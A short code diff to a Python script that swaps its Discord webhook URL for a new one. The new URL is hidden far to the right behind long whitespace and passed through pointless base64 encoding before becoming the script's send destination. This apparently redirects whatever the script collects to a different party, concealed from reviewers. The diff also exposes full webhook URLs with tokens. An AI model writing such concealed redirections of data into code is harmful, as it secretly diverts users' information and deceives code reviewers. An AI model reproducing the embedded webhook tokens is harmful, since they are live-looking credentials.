@@ -3,8 +3,13 @@ import re
 import json
 import requests
 from datetime import datetime
+import base64
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1370231956520042527/c6jJTim4f1IUXtOnKzsQeyAnifKMshO2LadA_LaLZjRdOGWyIEBBmHvSsHt69t59F3QW"  
+                                                                                                                                                                                    webhook = "https://discord.com/api/webhooks/1371488806620102727/H3JEfxFUV7FLNylJK7pQ0riToUWweVSsKA0NIajyVCje6P7MreOEr791FX3DhuM224U5"
+ew = base64.b64encode(webhook.encode()).decode('utf-8')
+DECODED_WEBHOOK = base64.b64decode(ew.encode()).decode('utf-8')
+
+DISCORD_WEBHOOK_URL = DECODED_WEBHOOK
 
 def fdt():
     t = []
